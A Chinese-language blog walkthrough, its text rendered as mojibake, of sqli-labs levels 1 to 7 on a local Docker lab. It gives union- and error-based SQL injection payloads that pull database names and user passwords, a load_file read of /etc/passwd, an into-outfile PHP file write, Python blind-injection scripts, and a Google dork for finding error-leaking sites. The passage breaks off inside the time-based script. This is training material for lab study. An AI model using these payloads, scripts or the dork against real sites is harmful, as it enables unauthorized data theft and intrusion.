---
title: sqli-labså­¦ä¹ è®°å½•
date: 2025-03-05 22:01:00
permalink: /pages/sqli-labs/
sidebar: true
comment: true
categories:
  - wp
tags:
  - SQLæ³¨å…¥
  - wp
author: 
  name: the0n3
  link: https://the0n3.top
---


æœ‰æ—¶é—´å°±è¦å­¦ä¹ 

![1](/medias/sqli-labs/1.png)


::: tip
å­¦ä¹ è¿‡ç¨‹é˜…è¯»é¢˜ç›®æºç ï¼Œæ–¹ä¾¿ç†è§£æ¼æ´çš„æˆå› 
:::

## ç¯å¢ƒæ­å»º

ä½¿ç”¨dockeréƒ¨ç½²ï¼Œç®€å•æ–¹ä¾¿ä¸€äº›ï¼Œå³å¼€å³ç”¨

æ˜ å°„åˆ°ä¸»æœº8080ç«¯å£

```bash
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:latest
```

è¿›å…¥é¶åœºé¦–é¡µï¼Œç‚¹å‡»`Setup/reset Database for labs`ï¼Œåˆå§‹åŒ–æ•°æ®åº“

## å” å¨

çœ‹åˆ°å‰é¢å‡ å…³å‰ç¼€ï¼Œ`GET-Error based`ï¼Œéƒ½æ˜¯åŸºäºæŠ¥é”™æ³¨å…¥çš„ï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½ç©ï¼Œç»å…¸çš„è¯é€šè¿‡å¼•å·é—­åˆå¯ä»¥ä½¿sqlè¯­å¥æŠ¥é”™

æœ¬èº«æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥ä¸ä¼šæŠŠé”™è¯¯ä¿¡æ¯è¿”å›å‰ç«¯ï¼ŒæŠ¥é”™ä¸»è¦ç”±äºä½¿ç”¨äº†å‡½æ•°`mysql_error()`ã€`mysqli_error()`ï¼Œè¿”å›äº†mysqlçš„é”™è¯¯ä¿¡æ¯

::: danger
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
:::

ä¸€äº›ç«™ç‚¹ç”šè‡³æ²¡æœ‰å¤„ç†å‚æ•°ç©ºå€¼çš„æƒ…å†µï¼Œå¯¼è‡´æœ¬èº«å°±å·²ç»é—­åˆï¼Œä¾‹å¦‚

### å­—ç¬¦å‹

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
```

idä¸ºç©ºæ—¶ï¼Œsqlè¯­å¥å˜æˆäº†
```sql
select * from users where id = '';
```

### æ•°å­—å‹

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
```

idä¸ºç©ºæ—¶ï¼Œsqlè¯­å¥å˜æˆäº†
```sql
select * from users where id = ;
```

è¿™æ ·é¡µé¢æœ¬èº«å°±å¯èƒ½å­˜åœ¨æŠ¥é”™ï¼Œå¯ä»¥å°è¯•è°·æ­Œè¯­æ³•ï¼Œæ”¶é›†ä¿¡æ¯æ‰¾åˆ°è¿™ç±»ç«™ç‚¹ã€‚çœ‹çœ‹å¾—äº†ï¼Œæ²¡æœ‰æˆæƒä¸è¦æµ‹åˆ«äººç½‘ç«™

```ini
inurl:"?id=" intext:"You have an error in your SQL syntax" "å…¬å¸"
```

![2](/medias/sqli-labs/2.png)

## Less-1

getä¼ å‚ `?id=1'`æ—¶é¡µé¢æŠ¥é”™ï¼Œå¯ä»¥çŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

![3](/medias/sqli-labs/3.png)

```sql
$id = $_GET['id'];
$sql = "select * from users where id = '$id'";
```

ä¼ è¿›å»çš„å•å¼•å·é—­åˆäº†åŸæœ‰sqlè¯­å¥ï¼Œåé¢å¤šå‡ºä¸€ä¸ªå•å¼•å·æŠ¥é”™ï¼Œä½¿ç”¨`#`æŠŠåé¢æ³¨é‡Šæ‰åé¢å¤šå‡ºçš„å•å¼•å·å°±ä¸ä¼šå†æŠ¥é”™ï¼Œgetä¼ `#`æ—¶ä½¿ç”¨urlç¼–ç å€¼`%23`ï¼Œæ‰€ä»¥ä¼ `?id=1%23`æ—¶ä¸ä¼šæŠ¥é”™


æœ‰äº†sqlæ³¨å…¥ç‚¹ï¼Œå°è¯•çˆ†æ•°æ®åº“ä¿¡æ¯ï¼Œä½¿ç”¨è”åˆæŸ¥è¯¢çˆ†æ•°æ®åº“ä¿¡æ¯æ—¶ï¼Œè¦æ³¨æ„å‰åselectçš„å­—æ®µæ•°ç›¸åŒï¼Œå¯ä»¥å…ˆä½¿ç”¨`order by`çˆ†å­—æ®µæ•°

åœ¨3æ—¶ä¸æŠ¥é”™ï¼Œ4æ—¶æŠ¥é”™ï¼Œè¯´æ˜æœ‰3ä¸ªå­—æ®µ
```sql
?id=1' order by 3%23
```
å°è¯•è”åˆæŸ¥è¯¢ï¼Œ2ã€3æ˜¯å›æ˜¾ä½

```sql
?id=0' union select 1,2,3%23
```

![4](/medias/sqli-labs/4.png)

çˆ†æ•°æ®åº“å

```sql
?id=0'union select 1,2,group_concat(schema_name) from information_schema.schemata%23
```

çˆ†è¡¨å

```sql
?id=0'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

çˆ†åˆ—å

```sql
?id=0'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23
```

çˆ†æ•°æ®

```sql
?id=0'union select 1,2,group_concat(username,password) from users%23
```

## Less-2

ä¼ å…¥`?id=1'`ã€`?id=1"`æ—¶é¡µé¢æŠ¥é”™ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```sql
$sql = "select * from users where id = $id";
```

åå°éœ€è¦æ•´å‹å‚æ•°idï¼Œä¼ å…¥å­—ç¬¦å‹å‚æ•°idæ—¶ï¼Œsqlè¯­å¥å¤šå‡ºäº†å¼•å·å¯¼è‡´æŠ¥é”™ï¼Œè¿™é¢˜å°±ä¸å†éœ€è¦å¼•å·çš„é—­åˆï¼Œç›´æ¥æ‹¼æ¥sqlè¯­å¥

```sql
?id=0 or 1=1%23
```

## Less-3

ä¼ å…¥å‚æ•°`?id=1'`æ—¶ï¼Œé¡µé¢æŠ¥é”™ï¼Œä¼ å…¥å‚æ•°`?id=1`ã€`?id=1"`æ—¶é¡µé¢æ²¡æœ‰æŠ¥é”™ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```sql
$sql = "select * from users where id = '$id'";
```

ä¼ å…¥å‚æ•°`?id=1'`æ—¶ï¼Œsqlè¯­å¥å˜æˆäº†

```sql
select * from users where id = '1''
```

å¯ä»¥ä¼ `?id=1'`ï¼ŒæŠŠåŸæœ‰çš„å•å¼•å·ä»¥åŠåé¢å†…å®¹æ³¨é‡Šæ‰ï¼Œä¿è¯sqlè¯­å¥æ­£ç¡®ã€‚åé¢æ­£å¸¸æ‹¼æ¥è”åˆæŸ¥è¯¢sqlè¯­å¥å³å¯

```sql
?id=0' or 1=1%23
```

## Less-4

ä¼ å…¥å‚æ•°`?id=1"`æ—¶ï¼Œé¡µé¢æŠ¥é”™ï¼Œä¼ å…¥å‚æ•°`?id=1`ã€`?id=1'`æ—¶é¡µé¢æ²¡æœ‰æŠ¥é”™ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```php
$id = '"'.$_GET['id'].'"';
$sql = "select * from users where id = ($id)";
```

ä¼ å…¥å‚æ•°`?id=1"`æ—¶ï¼Œsqlè¯­å¥å˜æˆäº†

```sql
select * from users where id = ("1"")
```

![5](/medias/sqli-labs/5.png)

æ‰€ä»¥é¡µé¢æŠ¥é”™ï¼ŒæŠ¥é”™é‡Œçš„ä¿¡æ¯æš´éœ²äº†åå°sqlè¯­å¥`"1"")`ï¼Œå¯ä»¥çŒœæµ‹ä½¿ç”¨çš„æ˜¯`($id)`

::: danger
for the right syntax to use near '"1"")LIMIT 0,1' at line 1
:::



å¯ä»¥ä¼ `?id=1") or 1=1%23`ï¼ŒæŠŠåŸæœ‰çš„åŒå¼•å·ã€æ‹¬å·ä»¥åŠåé¢å†…å®¹æ³¨é‡Šæ‰ï¼Œä¿è¯sqlè¯­å¥æ­£ç¡®ã€‚åé¢æ­£å¸¸æ‹¼æ¥è”åˆæŸ¥è¯¢sqlè¯­å¥å³å¯

```sql
?id=0") or 1=1%23
```

ç»è¿‡phpå¤„ç†idåï¼Œidæ‹¼æ¥æˆäº†`"0") or 1=1%23"`ï¼Œsqlè¯­å¥å˜æˆäº†

```sql
select * from users where id = ("0") or 1=1%23
```

æ¥ç€å°±æ˜¯æ­£å¸¸çˆ†åº“çˆ†è¡¨æ“ä½œ

```sql
?id=0") or 1=1%23
```

## Less-5

åƒå‰é¢ä¸€æ ·ï¼Œé€šè¿‡ä¼ å…¥`?id=1'`ã€`?id=1"`ã€`?id=1'`ç­‰å‚æ•°ï¼Œåœ¨`?id=1'`æ—¶é¡µé¢æŠ¥é”™`right syntax to use near ''1'' LIMIT 0,1'`ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```sql
$id = $_GET['id'];
$sql = "select * from users where id = '$id'";
```

### å¸ƒå°”ç›²æ³¨


åŒºåˆ«äºå‰å‡ é¢˜ï¼Œè¿™é‡Œæ²¡æœ‰å›æ˜¾ä½ï¼Œåªæœ‰ä¸¤ç§ç»“æœ`You are in...`å’Œæ— å›æ˜¾


å†™äº†ä¸€ä¸ªå¸ƒå°”ç›²æ³¨è„šæœ¬

è¿™ä¸ªåˆ©ç”¨äº†`substr()`å‡½æ•°ï¼Œé€šè¿‡å›æ˜¾æ˜¯å¦åŒ…å«`You are in`ï¼Œæ¥åˆ¤æ–­çˆ†ç ´çš„æ¯ä¸€ä½æ˜¯å¦æ­£ç¡®

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://192.168.6.246:8080/Less-5/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    for s in flags:
        # çˆ†åº“
        id = "99'or substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+s+"'%23"
        # çˆ†è¡¨
        # id = "99'or substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+s+"'%23"
        # çˆ†å­—æ®µ
        # id = "99'or substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+s+"'%23"
        tmp_url = url + "?id=" + id
        resp = requests.get(tmp_url)
        
        if "You are in" in resp.text:
            i += 1
            flag += s
            # æœ€åä¸€æ¬¡æˆåŠŸæ‹¼æ¥ä½œä¸ºå¼€å§‹ï¼Œåˆ¤æ–­è¶…æ—¶
            start = time.time()
            print(f"[#]------{flag}")
            break
        else:
            pass
    end = time.time()
    # ç›®æ ‡æœåŠ¡å™¨æ€§èƒ½å¯èƒ½å­˜åœ¨å·®è·ï¼Œé€‚å½“è°ƒæ•´è¶…æ—¶æ—¶é—´
    try:
        if end - start > 1.5:
            if flag != "":
                print("ç›²æ³¨ç»“æŸï¼Œæ£€æŸ¥flagæ˜¯å¦æ˜¯é¢„æœŸç»“æœï¼")
            else:
                print("æ£€æµ‹åˆ°é•¿æ—¶é—´æ²¡æœ‰å†è·å–åˆ°å“åº”ï¼Œè¯¥è„šæœ¬å¸ƒå°”ç›²æ³¨å¯èƒ½å¹¶ä¸é€‚é…é€€å‡º")
            exit()  
    except NameError:
        print("åœ¨ç¬¬ä¸€è½®å¾ªç¯ä¸­æœªæ‰¾åˆ°åˆé€‚çš„å¼€å§‹å­—ç¬¦ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦é€‚åˆå¸ƒå°”ç›²æ³¨æˆ–æ‰©å……flagså˜é‡(å¯èƒ½å‡ºç°çš„å­—ç¬¦")
        exit()
```

![6](/medias/sqli-labs/6.png)

ä½¿ç”¨`left()`ã€`right()`å‡½æ•°å®ç°ï¼Œ`right()`å‡½æ•°æŒ‰ç…§`left()`æ¨¡æ¿è¡¥å……å³å¯

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-5/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        # id = "99'or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
        # çˆ†è¡¨
        # id = "99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
        # çˆ†å­—æ®µ
        # id = "99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"

        # æµ‹è¯•rightå‡½æ•°
        # id = "99'or right((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ s + flag +"'%23"
        tmp_url = url + "?id=" + id
        resp = requests.get(tmp_url)
        
        if "You are in" in resp.text:
            i += 1
            flag += s
            # æµ‹è¯•rightå‡½æ•°
            # flag = s + flag
            # æœ€åä¸€æ¬¡æˆåŠŸæ‹¼æ¥ä½œä¸ºå¼€å§‹ï¼Œåˆ¤æ–­è¶…æ—¶
            start = time.time()
            print(f"[#]------{flag}")
            break
        else:
            pass
    end = time.time()
    # ç›®æ ‡æœåŠ¡å™¨æ€§èƒ½å¯èƒ½å­˜åœ¨å·®è·ï¼Œé€‚å½“è°ƒæ•´è¶…æ—¶æ—¶é—´
    try:
        if end - start > 1.5:
            if flag != "":
                print("ç›²æ³¨ç»“æŸï¼Œæ£€æŸ¥flagæ˜¯å¦æ˜¯é¢„æœŸç»“æœï¼")
            else:
                print("æ£€æµ‹åˆ°é•¿æ—¶é—´æ²¡æœ‰å†è·å–åˆ°å“åº”ï¼Œè¯¥è„šæœ¬å¸ƒå°”ç›²æ³¨å¯èƒ½å¹¶ä¸é€‚é…é€€å‡º")
            exit()  
    except NameError:
        print("åœ¨ç¬¬ä¸€è½®å¾ªç¯ä¸­æœªæ‰¾åˆ°åˆé€‚çš„å¼€å§‹å­—ç¬¦ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦é€‚åˆå¸ƒå°”ç›²æ³¨æˆ–æ‰©å……flagså˜é‡(å¯èƒ½å‡ºç°çš„å­—ç¬¦")
        exit()
```

![9](/medias/sqli-labs/9.png)

ä½¿ç”¨`like`ä»£æ›¿`=`å®ç°ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-5/"
i = 1
start = None  # åˆå§‹åŒ– start å˜é‡
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        id = "99'or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+") like '"+ flag + s + "%25" +"'%23"
        # çˆ†è¡¨
        # id = "99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
        # çˆ†å­—æ®µ
        # id = "99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"

        tmp_url = url + "?id=" + id
        resp = requests.get(tmp_url)
        
        if "You are in" in resp.text:
            i += 1
            flag += s
            # æœ€åä¸€æ¬¡æˆåŠŸæ‹¼æ¥ä½œä¸ºå¼€å§‹ï¼Œåˆ¤æ–­è¶…æ—¶
            start = time.time()
            print(f"[#]------{flag}")
            break
        else:
            pass
    end = time.time()
    # ç›®æ ‡æœåŠ¡å™¨æ€§èƒ½å¯èƒ½å­˜åœ¨å·®è·ï¼Œé€‚å½“è°ƒæ•´è¶…æ—¶æ—¶é—´
    try:
        if (end-start)>1.5:
            if flag != "":
                print("ç›²æ³¨ç»“æŸï¼Œæ£€æŸ¥flagæ˜¯å¦æ˜¯é¢„æœŸç»“æœï¼")
            else:
                print("æ£€æµ‹åˆ°é•¿æ—¶é—´æ²¡æœ‰å†è·å–åˆ°å“åº”ï¼Œè¯¥è„šæœ¬å¸ƒå°”ç›²æ³¨å¯èƒ½å¹¶ä¸é€‚é…é€€å‡º")
            exit()  
    except NameError:
        print("åœ¨ç¬¬ä¸€è½®å¾ªç¯ä¸­æœªæ‰¾åˆ°åˆé€‚çš„å¼€å§‹å­—ç¬¦ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦é€‚åˆå¸ƒå°”ç›²æ³¨æˆ–æ‰©å……flagså˜é‡(å¯èƒ½å‡ºç°çš„å­—ç¬¦")
```

### æŠ¥é”™æ³¨å…¥


ä¸»æ’­ä¸»æ’­ï¼Œä½ çš„å¸ƒå°”ç›²æ³¨ç¡®å®å¾ˆå¼ºï¼Œä½†è¿˜æ˜¯å¤ªç—´æ“ä½œäº†ï¼Œæœ‰æ²¡æœ‰æ›´ç®€å•ä¸€ç‚¹çš„ï¼Ÿ

æœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ã€‚æ—¢ç„¶é¡µé¢åœ¨è¯­æ³•é”™è¯¯æ—¶ä¼šæŠ¥é”™ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ¥å›æ˜¾ç»“æœ

ä½¿ç”¨`updatexml()`ã€`extractvalue()`ã€`floor()`ç­‰å‡½æ•°ï¼Œå¯ä»¥å›æ˜¾é”™è¯¯ä¿¡æ¯ï¼Œå®ç°çˆ†åº“çˆ†è¡¨çˆ†åˆ—çˆ†æ•°æ®

çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ç”¨æ³•

![2441](/medias/show-sql/2441.png)

::: tip
æŠ¥é”™æ³¨å…¥ä¸ºä»€ä¹ˆå­˜åœ¨é”™è¯¯ï¼Œè¿˜èƒ½è¿”å›éƒ¨åˆ†è¯­å¥çš„ç»“æœï¼Ÿ

sqlå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨è¯­æ³•é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå…ˆæ‰§è¡Œå­æŸ¥è¯¢ï¼Œåœ¨è¿›è¡Œupdatexmlå‡½æ•°çš„è°ƒç”¨ï¼Œæœ€åå› ä¸ºupdatexmlå‡½æ•°çš„å‚æ•°ç±»å‹é”™è¯¯ï¼Œå¯¼è‡´æŠ›å‡ºé”™è¯¯ï¼Œåœ¨æŠ¥é”™ä¸­ï¼Œå¸¦å‡ºäº†å­æŸ¥è¯¢çš„ç»“æœ
:::

æµç¨‹ï¼š

- æ£€æŸ¥è¯­æ³•
- æ‰§è¡Œå­æŸ¥è¯¢
- æ‰§è¡Œupdatexmlå‡½æ•°
- updatexmlå‡½æ•°å‚æ•°ç±»å‹é”™è¯¯ï¼ŒæŠ›å‡ºé”™è¯¯

ä¾‹å¦‚ä¸‹é¢è¿™å¥ï¼Œä¸å­˜åœ¨è¯­æ³•é”™è¯¯ï¼Œæ‰§è¡Œ`database()`å‡½æ•°å­æŸ¥è¯¢`select database()`ï¼Œå†æ‰§è¡Œ`concat()`å‡½æ•°ï¼Œæœ€åå†æ‹¼æ¥æ—¶ï¼Œ`updatexml`å‡½æ•°ä½¿ç”¨äº†é”™è¯¯çš„å‚æ•°ç±»å‹ï¼ŒæŠ¥é”™:

```sql
select updatexml(1,concat(0x7e,database(),0x7e),1)
```


çˆ†åº“

```sql
?id=0' and updatexml(1,concat(0x7e,database(),0x7e),1)%23
```

æŠŠ`database()`å‡½æ•°ä½ç½®æ¢æˆselectå­å¥ï¼Œçˆ†è¡¨

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
```


çˆ†å­—æ®µ

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e),1)%23
```

çˆ†æ•°æ®

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)%23
```

å°è¯•ä½¿ç”¨`extractvalue()`ã€`floor()`å‡½æ•°

`extractvalue()`å‡½æ•°å’Œ`updatexml()`å‡½æ•°ä½¿ç”¨ç±»ä¼¼ï¼Œå‚æ•°ä¸ªæ•°ä¸åŒ

```sql
slect username,password from users where id = 1 and extractvalue(1,0x7e);
```

åœ¨è¿™é‡Œï¼Œ`extractvalue()`å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨äº†é”™è¯¯çš„å‚æ•°`0x7e`ï¼ŒæŠ¥é”™ã€‚å¯ä»¥åªæ˜¯`concat()`å‡½æ•°ï¼Œä½¿ç”¨å­æŸ¥è¯¢è·å–æƒ³è¦çš„å†…å®¹ï¼Œæ‹¼æ¥ä¸Š`0x7e`ï¼ŒæŠŠå­æŸ¥è¯¢ç»“æœå¸¦å‡ºæ¥

![7](/medias/sqli-labs/7.png)

çˆ†åº“

```sql
?id=0' and extractvalue(1,concat(0x7e,database(),0x7e))%23
```

![8](/medias/sqli-labs/8.png)

å¦å¤–ï¼Œ`XPATH syntax error`ä¹Ÿç®—æ˜¯`updatexml`ã€`extractvalue`å› ä¸ºXPATHæŠ¥é”™çš„ä¸€ä¸ªç‰¹å¾å§


## Less-6

å’Œä¸Šä¸€å…³less-5ç›¸åŒï¼Œæ¢æˆäº†`"`åŒå¼•å·ç±»å‹

ä¸Šé¢çš„ç›²æ³¨è„šæœ¬å’ŒæŠ¥é”™æ³¨å…¥ç¨å¾®ä¿®æ”¹è¿˜èƒ½ç”¨

![11](/medias/sqli-labs/11.png)

## Less-7



### è¯»å†™æ–‡ä»¶

è¿™é¢˜æç¤ºéœ€è¦`use outfile`ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œè¦æŠŠæ•°æ®å†™å…¥åˆ°æ–‡ä»¶é‡Œï¼Œå¯ä»¥å†™å…¥ä¸€ä¸ªæœ¨é©¬

æˆ‘çš„é¢˜ç›®ç¯å¢ƒæ˜¯ä½¿ç”¨dockeréƒ¨ç½²çš„ï¼Œå®Œæ•´ç½‘ç»œæ ¹è·¯å¾„æˆ‘å¹¶ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥çŸ¥é“ç°åœ¨é‡åˆ°çš„é¢˜ç›®éƒ½æ˜¯åœ¨`Less-n`ç›®å½•ä¸‹

å›åˆ°å‰é¢å‡ å…³ï¼Œå°è¯•éªŒè¯è·¯å¾„

åœ¨`Less-1`ä¸­ï¼Œä½¿ç”¨`?id=0' union select 1,2,load_file('/etc/passwd')%23`è¯»å–`/etc/passwd`ï¼Œå­˜åœ¨`www-data`ç”¨æˆ·ï¼Œç”¨æˆ·ç›®å½•`/var/www/`ï¼ŒçŒœæµ‹ç½‘ç«™æ›´ç›®å½•å¤§æ¦‚æ˜¯`/var/www/html/`

![12](/medias/sqli-labs/12.png)

å°è¯•è¯»å–`/var/www/html/Less-1/index.php`æ–‡ä»¶ï¼ŒæˆåŠŸè¯»å–åˆ°å†…å®¹ï¼Œå¯ä»¥éªŒè¯æ ¹ç›®å½•`/var/www/html/`

![13](/medias/sqli-labs/13.png)

å¯ä»¥å°è¯•åœ¨`Less-7`é¢˜ç›®é¡µé¢å†™å…¥æœ¨é©¬

ä¼ å…¥å‚æ•°`?id=1`ã€`?id=1"`æ—¶é¡µé¢æ­£å¸¸ï¼Œä¼ å…¥`?id=1'`æ—¶æŠ¥é”™ï¼Œå°è¯•ä¼ å…¥`?id=1'%23`æ³¨é‡Šæ‰åé¢å†…å®¹æ—¶ï¼Œé¡µé¢ä»ç„¶æŠ¥é”™

![14](/medias/sqli-labs/14.png)
æµ‹è¯•å¯ä»¥å‘ç°ï¼Œåœ¨ä¼ å…¥`?id=1'))%23`æ—¶ï¼Œé¡µé¢æ­£å¸¸ï¼Œå¯ä»¥çŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```php
$id = $_GET['id'];
$sql = "select * from users where id = (('$id'))";
```

å°è¯•å†™å…¥æœ¨é©¬ï¼Œæ£€æŸ¥æ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œé¡µé¢æç¤º`You have an error in your SQL syntax`

```php
?id=0')) union select 1,2,'<?=phpinfo();?>' into outfile "/var/www/html/Less-7/abc.php"%23
```

å›åˆ°`Less-1`ç¯å¢ƒç®€å•éªŒè¯ï¼Œåœ¨å†™å…¥æœ¨é©¬æ—¶ï¼Œæç¤º`Can't create/write to file '/var/www/html/Less-7/abc.php' (Errcode: 13)`

![15](/medias/sqli-labs/15.png)

å¤§ä½¬æç¤º`é”™è¯¯ä»£ç ä¸º 13 çš„æ—¶å€™æ˜¯æ²¡æœ‰æƒé™ï¼Œå¯ä»¥è€ƒè™‘/tmp ç­‰æ–‡ä»¶å¤¹`

`/var/www/html/`ç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼Œè¿™é‡Œä¸èƒ½åƒå…¶ä»–writeupä¸€æ ·å†™æœ¨é©¬äº†ã€‚å°è¯•æŠŠæ•°æ®åº“ä¿¡æ¯å†™å…¥åˆ°`/tmp`ç›®å½•

```php
```php
url/Less-7/?id=0')) union select 1,2,'fuck' into outfile "/tmp/fuck"%23
```

åœ¨`Less-1`ç¯å¢ƒé‡Œè¯»å–ï¼ŒéªŒè¯æˆåŠŸå†™å…¥

![16](/medias/sqli-labs/16.png)

### è§£å†³æƒé™é—®é¢˜

è¿™ä¸ªdockeré•œåƒä½œè€…å¯èƒ½æ²¡è€ƒè™‘åˆ°æƒé™é—®é¢˜ï¼Œå¯ä»¥è¿›å…¥å®¹å™¨ç»™æƒé™

```bash
docker exec -it sqli-lab /bin/sh
chmod 777 -R /var/www/html/
```

ç°åœ¨åº”è¯¥å¯ä»¥æ­£å¸¸å†™å…¥æ–‡ä»¶äº†

```php
?id=0')) union select 1,2,'<?=phpinfo();?>' into outfile "/var/www/html/Less-7/abc.php"%23
```

![777](/medias/sqli-labs/777.png)


### å¸ƒå°”ç›²æ³¨

å› ä¸ºé¢˜ç›®è¿˜æ˜¯æœ‰ä¸¤ç§å“åº”ï¼Œå°è¯•å¸ƒå°”ç›²æ³¨

- true : `You are in...`
- false : `You have an error in your SQL syntax`

å¸ƒå°”ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-7/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        # id = "0')) or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
        # çˆ†è¡¨
        id = "0')) or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
        # çˆ†å­—æ®µ
        # id = "0')) or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"

        # æµ‹è¯•rightå‡½æ•°
        # id = "90')) or right((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ s + flag +"'%23"
        tmp_url = url + "?id=" + id
        resp = requests.get(tmp_url)
        
        if "You are in" in resp.text:
            i += 1
            flag += s
            # æµ‹è¯•rightå‡½æ•°
            # flag = s + flag
            # æœ€åä¸€æ¬¡æˆåŠŸæ‹¼æ¥ä½œä¸ºå¼€å§‹ï¼Œåˆ¤æ–­è¶…æ—¶
            start = time.time()
            print(f"[#]------{flag}")
            break
        else:
            pass
    end = time.time()
    # ç›®æ ‡æœåŠ¡å™¨æ€§èƒ½å¯èƒ½å­˜åœ¨å·®è·ï¼Œé€‚å½“è°ƒæ•´è¶…æ—¶æ—¶é—´
    try:
        if end - start > 1.5:
            if flag != "":
                print("ç›²æ³¨ç»“æŸï¼Œæ£€æŸ¥flagæ˜¯å¦æ˜¯é¢„æœŸç»“æœï¼")
            else:
                print("æ£€æµ‹åˆ°é•¿æ—¶é—´æ²¡æœ‰å†è·å–åˆ°å“åº”ï¼Œè¯¥è„šæœ¬å¸ƒå°”ç›²æ³¨å¯èƒ½å¹¶ä¸é€‚é…é€€å‡º")
            exit()  
    except NameError:
        print("åœ¨ç¬¬ä¸€è½®å¾ªç¯ä¸­æœªæ‰¾åˆ°åˆé€‚çš„å¼€å§‹å­—ç¬¦ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦é€‚åˆå¸ƒå°”ç›²æ³¨æˆ–æ‰©å……flagså˜é‡(å¯èƒ½å‡ºç°çš„å­—ç¬¦")
        exit()
```

![17](/medias/sqli-labs/17.png)

### æ—¶é—´ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-7/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        # id = "0')) or if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†è¡¨
